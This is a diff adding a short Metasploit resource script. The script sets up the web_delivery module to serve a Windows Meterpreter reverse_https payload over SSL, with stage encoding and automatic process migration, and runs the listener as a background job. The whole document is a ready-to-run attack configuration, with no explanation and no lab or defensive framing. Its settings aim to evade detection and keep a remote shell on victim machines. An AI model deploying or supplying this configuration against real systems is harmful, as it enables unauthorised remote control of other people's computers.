@@ -1,0 +1,12 @@
+use exploit/multi/script/web_delivery
+set SRVHOST 0.0.0.0
+set SRVPORT 443
+set SSL true
+set target 2 
+set payload windows/meterpreter/reverse_https 
+set exitonsession false 
+set lhost 0.0.0.0 
+set lport 8443
+set enablestageencoding true
+set autorunscript migrate -f
+exploit -j -z
